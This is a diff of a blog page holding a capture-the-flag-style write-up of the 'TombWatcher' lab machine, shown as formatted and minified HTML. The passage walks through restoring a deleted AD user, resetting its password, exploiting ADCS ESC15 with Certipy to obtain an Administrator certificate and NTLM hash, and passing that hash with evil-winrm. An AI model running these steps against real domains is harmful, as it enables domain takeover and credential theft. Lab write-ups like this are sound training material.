+</span></span><span class=line><span class=cl>                                          S-1-5-21-1392491010-1358638721-2126982587-1111</span></span></code></pre></div></div><p>We can see that there is an interesting entity that has enrollment rights, but it has an unresolved SID: S-1-5-21-1392491010-1358638721-2126982587-1111</p><p>This suggests a potential misconfiguration or deleted privilege still present on the template. If the SID belonged to a previously deleted user with vulnerabilities, this could be leveraged for privilege escalation or abuse of certificate enrollment.</p><h3 id=discovering-deleted-users>Discovering Deleted Users</h3><p>Now we can check the Active Directory Recycle Bin (on the host) for deleted users by using previously founded information.</p><p>Once on the box as john, I imported the Active Directory module and searched for deleted objects:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-powershell"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=n>ActiveDirectory</span>
+</span></span><span class=line><span class=cl><span class=nb>Get-ADObject</span> <span class=n>-Filter</span> <span class=s1>&#39;isDeleted -eq $true -and objectClass -eq &#34;user&#34;&#39;</span> <span class=n>-IncludeDeletedObjects</span> <span class=n>-Properties</span> <span class=p>*</span> <span class=p>|</span> <span class=nb>Select-Object</span> <span class=n>Name</span><span class=p>,</span><span class=n>SamAccountName</span><span class=p>,</span><span class=n>DistinguishedName</span><span class=p>,</span><span class=n>WhenChanged</span><span class=p>,</span><span class=n>ObjectGUID</span></span></span></code></pre></div></div><p>This revealed multiple deleted instances of a user named <strong><code>cert_admin</code></strong>:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-powershell"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>Name</span>              <span class=err>:</span> <span class=n>cert_admin</span>
+</span></span><span class=line><span class=cl>                    <span class=n>DEL</span><span class=err>:</span><span class=n>f80369c8</span><span class=p>-</span><span class=n>96a2</span><span class=p>-</span><span class=n>4a7f-a56c</span><span class=p>-</span><span class=n>9c15edd7d1e3</span>
+</span></span><span class=line><span class=cl><span class=n>SamAccountName</span>    <span class=err>:</span> <span class=n>cert_admin</span>
+</span></span><span class=line><span class=cl><span class=n>DistinguishedName</span> <span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=n>cert_admin</span><span class=p>\</span><span class=n>0ADEL</span><span class=err>:</span><span class=n>f80369c8</span><span class=p>-</span><span class=n>96a2</span><span class=p>-</span><span class=n>4a7f-a56c</span><span class=p>-</span><span class=n>9c15edd7d1e3</span><span class=p>,</span><span class=n>CN</span><span class=p>=</span><span class=n>Deleted</span> <span class=n>Objects</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>tombwatcher</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>htb</span>
+</span></span><span class=line><span class=cl><span class=n>WhenChanged</span>       <span class=err>:</span> <span class=mf>11</span><span class=p>/</span><span class=mf>15</span><span class=p>/</span><span class=mf>2024</span> <span class=mf>7</span><span class=err>:</span><span class=mf>57</span><span class=err>:</span><span class=mf>59</span> <span class=n>PM</span>
+</span></span><span class=line><span class=cl><span class=n>ObjectGUID</span>        <span class=err>:</span> <span class=n>f80369c8</span><span class=p>-</span><span class=n>96a2</span><span class=p>-</span><span class=n>4a7f-a56c</span><span class=p>-</span><span class=n>9c15edd7d1e3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Name</span>              <span class=err>:</span> <span class=n>cert_admin</span>
+</span></span><span class=line><span class=cl>                    <span class=n>DEL</span><span class=err>:</span><span class=nb>c1f1f0fe-df9c</span><span class=p>-</span><span class=n>494c-bf05</span><span class=p>-</span><span class=n>0679e181b358</span>
+</span></span><span class=line><span class=cl><span class=n>SamAccountName</span>    <span class=err>:</span> <span class=n>cert_admin</span>
+</span></span><span class=line><span class=cl><span class=n>DistinguishedName</span> <span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=n>cert_admin</span><span class=p>\</span><span class=n>0ADEL</span><span class=err>:</span><span class=nb>c1f1f0fe-df9c</span><span class=p>-</span><span class=n>494c-bf05</span><span class=p>-</span><span class=n>0679e181b358</span><span class=p>,</span><span class=n>CN</span><span class=p>=</span><span class=n>Deleted</span> <span class=n>Objects</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>tombwatcher</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>htb</span>
+</span></span><span class=line><span class=cl><span class=n>WhenChanged</span>       <span class=err>:</span> <span class=mf>11</span><span class=p>/</span><span class=mf>16</span><span class=p>/</span><span class=mf>2024</span> <span class=mf>12</span><span class=err>:</span><span class=mf>04</span><span class=err>:</span><span class=mf>21</span> <span class=n>PM</span>
+</span></span><span class=line><span class=cl><span class=n>ObjectGUID</span>        <span class=err>:</span> <span class=nb>c1f1f0fe-df9c</span><span class=p>-</span><span class=n>494c-bf05</span><span class=p>-</span><span class=n>0679e181b358</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Name</span>              <span class=err>:</span> <span class=n>cert_admin</span>
+</span></span><span class=line><span class=cl>                    <span class=n>DEL</span><span class=err>:</span><span class=n>938182c3-bf0b</span><span class=p>-</span><span class=n>410a</span><span class=p>-</span><span class=n>9aaa</span><span class=p>-</span><span class=n>45c8e1a02ebf</span>
+</span></span><span class=line><span class=cl><span class=n>SamAccountName</span>    <span class=err>:</span> <span class=n>cert_admin</span>
+</span></span><span class=line><span class=cl><span class=n>DistinguishedName</span> <span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=n>cert_admin</span><span class=p>\</span><span class=n>0ADEL</span><span class=err>:</span><span class=n>938182c3-bf0b</span><span class=p>-</span><span class=n>410a</span><span class=p>-</span><span class=n>9aaa</span><span class=p>-</span><span class=n>45c8e1a02ebf</span><span class=p>,</span><span class=n>CN</span><span class=p>=</span><span class=n>Deleted</span> <span class=n>Objects</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>tombwatcher</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>htb</span>
+</span></span><span class=line><span class=cl><span class=n>WhenChanged</span>       <span class=err>:</span> <span class=mf>11</span><span class=p>/</span><span class=mf>16</span><span class=p>/</span><span class=mf>2024</span> <span class=mf>12</span><span class=err>:</span><span class=mf>07</span><span class=err>:</span><span class=mf>27</span> <span class=n>PM</span>
+</span></span><span class=line><span class=cl><span class=n>ObjectGUID</span>        <span class=err>:</span> <span class=n>938182c3-bf0b</span><span class=p>-</span><span class=n>410a</span><span class=p>-</span><span class=n>9aaa</span><span class=p>-</span><span class=n>45c8e1a02ebf</span></span></span></code></pre></div></div><h3 id=restoring-cert_admin>Restoring cert_admin</h3><p>I restored the most recent deleted user using its ObjectGUID:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-powershell"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Restore-ADObject</span> <span class=n>-Identity</span> <span class=n>938182c3-bf0b</span><span class=p>-</span><span class=n>410a</span><span class=p>-</span><span class=n>9aaa</span><span class=p>-</span><span class=n>45c8e1a02ebf</span></span></span></code></pre></div></div><p>I verified the restoration with <code>net user</code> and confirmed the account existed. I then examined the user&rsquo;s properties:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-powershell"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-ADUser</span> <span class=n>cert_admin</span> <span class=n>-Properties</span> <span class=p>*</span> <span class=p>|</span> <span class=nb>Select-Object</span> <span class=n>Name</span><span class=p>,</span> <span class=n>SamAccountName</span><span class=p>,</span> <span class=n>DistinguishedName</span><span class=p>,</span> <span class=n>Enabled</span><span class=p>,</span> <span class=n>GivenName</span><span class=p>,</span> <span class=n>Surname</span><span class=p>,</span> <span class=n>UserPrincipalName</span><span class=p>,</span> <span class=n>WhenCreated</span><span class=p>,</span> <span class=n>WhenChanged</span><span class=p>,</span> <span class=n>LastLogonTimestamp</span><span class=p>,</span> <span class=n>PasswordExpired</span><span class=p>,</span> <span class=n>PasswordNeverExpires</span><span class=p>,</span> <span class=n>ServicePrincipalName</span><span class=p>,</span> <span class=n>MemberOf</span></span></span></code></pre></div></div><p>The user <code>cert_admin</code> was located in the <strong>ADCS OU</strong>, and since john has <strong>GenericAll</strong> privileges on this OU, I could change cert_admin&rsquo;s password:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.10.11.72 -u <span class=s1>&#39;john&#39;</span> -p NewPassword -M change-password -o <span class=nv>USER</span><span class=o>=</span>cert_admin <span class=nv>NEWPASS</span><span class=o>=</span>NewPassword</span></span></code></pre></div></div><p>✅ <strong>Success!</strong> cert_admin&rsquo;s password was now <code>NewPassword</code>.</p><hr><h2 id=adcs-exploitation-esc15-attack>ADCS Exploitation: ESC15 Attack</h2><h3 id=enumerating-certificate-templates>Enumerating Certificate Templates</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy find -u <span class=s1>&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class=s1>&#39;NewPassword&#39;</span> -dc-ip <span class=s1>&#39;10.10.11.72&#39;</span> -text -vulnerable</span></span></code></pre></div></div><p>This gives the following output:</p><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>Certificate Authorities
   0
     CA Name                             : tombwatcher-CA-1
     DNS Name                            : DC01.tombwatcher.htb
@@ -588,143 +272,28 @@ Certificate Templates
     [!] Vulnerabilities
       ESC15                             : Enrollee supplies subject and schema version is 1.
     [*] Remarks
-      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.</code></pre></div>
-<p>The <strong>WebServer</strong> template is vulnerable to <strong>ESC15</strong> vulnerability:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>ESC15: Enrollee supplies subject and schema version is 1.</code></pre></div>
-<h3 id="understanding-esc15">Understanding ESC15</h3>
-<p>ESC15 (CVE-2024-49019) is a certificate template vulnerability where an attacker can inject arbitrary Application Policies into certificate requests when:</p>
-<ul>
-<li>The template uses schema version 1</li>
-<li>The enrollee can supply the subject</li>
-</ul>
-<p><strong>References:</strong></p>
-<ul>
-<li><a href="https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu" target="_blank" rel="noopener noreffer ">ESC15 - Certipy Wiki</a></li>
-<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019" target="_blank" rel="noopener noreffer ">CVE-2024-49019 Details</a></li>
-<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener noreffer ">ADCS ESC Vulnerabilities Overview</a></li>
-</ul>
-<h3 id="initial-attempt-failed">Initial Attempt (Failed)</h3>
-<p>My first attempt was to directly request a certificate with UPN spoofing:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -ca <span class="s1">&#39;tombwatcher-CA-1&#39;</span> -template <span class="s1">&#39;WebServer&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -u <span class="s1">&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;NewPassword&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -target <span class="s1">&#39;DC01.TOMBWATCHER.HTB&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -upn <span class="s1">&#39;Administrator@tombwatcher.htb&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -sid <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span></span></span></code></pre></div></div>
-<p>This generated an <code>administrator.pfx</code> certificate, but authentication failed because of a problem in the LDAP connection (possibly related to the OpenSSL version).</p>
-<p>So I tried another method found in the same reference:</p>
-<h3 id="esc15-exploitation-two-step-method">ESC15 Exploitation (Two-Step Method)</h3>
-<p>I had to use a specific version of Certipy that supports ESC15:</p>
-<p><strong>Reference:</strong> <a href="https://github.com/dru1d-foofus/Certipy/tree/esc15-ekuwu" target="_blank" rel="noopener noreffer ">Certipy ESC15 Branch by dru1d-foofus</a></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone -b esc15-ekuwu --single-branch https://github.com/dru1d-foofus/Certipy</span></span></code></pre></div></div>
-<p><strong>Step 1: Request Certificate Request Agent Certificate</strong></p>
-<p>First, I requested a certificate with the <strong>Certificate Request Agent</strong> application policy:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -dc-ip 10.10.11.72 -ca <span class="s1">&#39;tombwatcher-CA-1&#39;</span> -target-ip 10.10.11.72 <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -u cert_admin@tombwatcher.htb -p <span class="s1">&#39;NewPassword&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -template WebServer -application-policies <span class="s1">&#39;Certificate Request Agent&#39;</span></span></span></code></pre></div></div>
-<p>This generated <code>cert_admin.pfx</code>.</p>
-<p><strong>Step 2: Request Administrator Certificate On-Behalf-Of</strong></p>
-<p>Using the Certificate Request Agent certificate, I requested a certificate on behalf of the Administrator:</p>
-<p><strong>Reference:</strong> <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#:~:text=Enrollment%20Agent" target="_blank" rel="noopener noreffer ">Certificate Request Agent Abuse</a></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -u <span class="s1">&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;NewPassword&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -target <span class="s1">&#39;DC01.tombwatcher.htb&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -ca <span class="s1">&#39;tombwatcher-CA-1&#39;</span> -template <span class="s1">&#39;User&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -pfx cert_admin.pfx -on-behalf-of <span class="s1">&#39;tombwatcher\Administrator&#39;</span></span></span></code></pre></div></div>
-<p>This generated the final <code>administrator.pfx</code> certificate with proper Client Authentication capabilities.</p>
-<p><strong>Step 3: Authenticate as Administrator</strong></p>
-<p>With the valid administrator certificate, I authenticated and extracted the NTLM hash:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx <span class="s1">&#39;administrator.pfx&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span></span></span></code></pre></div></div>
-<p><strong>Step 4: Pass-the-Hash to Get Root Shell</strong></p>
-<p>Finally, I used Evil-WinRM with the extracted NTLM hash to gain a shell as Administrator:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.10.11.72 -u Administrator -H &lt;NTLM_HASH&gt;</span></span></code></pre></div></div>
-<p>🎉 <strong>Root flag obtained!</strong></p>
-<hr>
-<h2 id="conclusion">Conclusion</h2>
-<p><strong>TombWatcher</strong> provided an excellent deep-dive into Active Directory exploitation, showcasing:</p>
-<ol>
-<li><strong>Kerberoasting</strong>: Extracting and cracking service account credentials</li>
-<li><strong>BloodHound Analysis</strong>: Visualizing complex attack paths through AD relationships</li>
-<li><strong>Group Privilege Abuse</strong>: Leveraging AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner</li>
-<li><strong>DACL Manipulation</strong>: Modifying permissions to gain control over user accounts</li>
-<li><strong>AD Object Recovery</strong>: Restoring deleted accounts for lateral movement</li>
-<li><strong>ADCS ESC15 Exploitation</strong>: Injecting arbitrary application policies in v1 certificate templates</li>
-<li><strong>Certificate-Based Authentication</strong>: Using certificates for privilege escalation to Domain Admin</li>
-</ol>
-<p>This machine emphasizes the importance of properly securing Active Directory Certificate Services, monitoring group memberships and privileges, and understanding the complex web of permissions that can lead to domain compromise.</p>
-<hr>
-<p><strong>Thanks for reading! Happy hacking! 🚀</strong></p>
-</div><div class="post-footer" id="post-footer">
-    <div class="post-info">
-        <div class="post-info-line">
-            <div class="post-info-mod">
-                <span>Updated on 2025-10-23</span>
-            </div></div>
-        <div class="post-info-line">
-            <div class="post-info-md"></div>
-            <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" data-title="HTB Machine Writeup &#34;TombWatcher&#34;" data-via="Benhibafodhil" data-hashtags="HTB,Windows,Active Directory"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" data-title="HTB Machine Writeup &#34;TombWatcher&#34;"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" data-hashtag="HTB"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" data-title="HTB Machine Writeup &#34;TombWatcher&#34;"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" data-title="HTB Machine Writeup &#34;TombWatcher&#34;"><i data-svg-src="/f0dh1l/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" data-title="HTB Machine Writeup &#34;TombWatcher&#34;"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" data-title="HTB Machine Writeup &#34;TombWatcher&#34;" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2ff0dh1l%2fposts%2fhtb_tombwatcher%2f&amp;text=HTB%20Machine%20Writeup%20%22TombWatcher%22" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
-            </div>
-        </div>
-    </div>
-
-    <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/f0dh1l/tags/htb/">HTB</a>,&nbsp;<a href="/f0dh1l/tags/windows/">Windows</a>,&nbsp;<a href="/f0dh1l/tags/active-directory/">Active Directory</a></section>
-        <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/f0dh1l/">Home</a></span>
-        </section>
-    </div>
-
-    <div class="post-nav"><a href="/f0dh1l/posts/htb_artificial/" class="prev" rel="prev" title="HTB Machine Writeup &#34;Artificial&#34;"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HTB Machine Writeup "Artificial"</a></div>
-</div>
-</article></div>
-            </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/f0dh1l/" target="_blank">F0DH1L</a></span></div>
-        </div>
-    </footer></div>
-
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a>
-        </div>
-
-        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
-            </a>
-        </div><link rel="stylesheet" href="/f0dh1l/css/custom.css"><script src="/f0dh1l/lib/lazysizes/lazysizes.min.js"></script><script src="/f0dh1l/lib/clipboard/clipboard.min.js"></script><script src="/f0dh1l/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/f0dh1l/js/theme.min.js"></script></body>
-</html>
+      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.</code></pre></div><p>The <strong>WebServer</strong> template is vulnerable to <strong>ESC15</strong> vulnerability:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>ESC15: Enrollee supplies subject and schema version is 1.</code></pre></div><h3 id=understanding-esc15>Understanding ESC15</h3><p>ESC15 (CVE-2024-49019) is a certificate template vulnerability where an attacker can inject arbitrary Application Policies into certificate requests when:</p><ul><li>The template uses schema version 1</li><li>The enrollee can supply the subject</li></ul><p><strong>References:</strong></p><ul><li><a href=https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu target=_blank rel="noopener noreffer">ESC15 - Certipy Wiki</a></li><li><a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019 target=_blank rel="noopener noreffer">CVE-2024-49019 Details</a></li><li><a href=https://posts.specterops.io/certified-pre-owned-d95910965cd2 target=_blank rel="noopener noreffer">ADCS ESC Vulnerabilities Overview</a></li></ul><h3 id=initial-attempt-failed>Initial Attempt (Failed)</h3><p>My first attempt was to directly request a certificate with UPN spoofing:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy req -ca <span class=s1>&#39;tombwatcher-CA-1&#39;</span> -template <span class=s1>&#39;WebServer&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -u <span class=s1>&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class=s1>&#39;NewPassword&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -dc-ip <span class=s1>&#39;10.10.11.72&#39;</span> -target <span class=s1>&#39;DC01.TOMBWATCHER.HTB&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -upn <span class=s1>&#39;Administrator@tombwatcher.htb&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>    -sid <span class=s1>&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span></span></span></code></pre></div></div><p>This generated an <code>administrator.pfx</code> certificate, but authentication failed because of a problem in the LDAP connection (possibly related to the OpenSSL version).</p><p>So I tried another method found in the same reference:</p><h3 id=esc15-exploitation-two-step-method>ESC15 Exploitation (Two-Step Method)</h3><p>I had to use a specific version of Certipy that supports ESC15:</p><p><strong>Reference:</strong> <a href=https://github.com/dru1d-foofus/Certipy/tree/esc15-ekuwu target=_blank rel="noopener noreffer">Certipy ESC15 Branch by dru1d-foofus</a></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
